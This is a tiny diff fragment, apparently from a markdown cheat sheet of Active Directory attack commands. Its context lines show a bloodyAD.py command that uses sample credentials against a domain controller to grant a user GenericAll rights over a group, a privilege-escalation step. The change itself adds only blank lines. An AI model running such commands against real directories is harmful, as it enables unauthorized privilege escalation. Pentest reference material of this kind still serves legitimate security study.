@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:36:10.633986+00:00'
 ```bash
 bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp
 ```
+
+
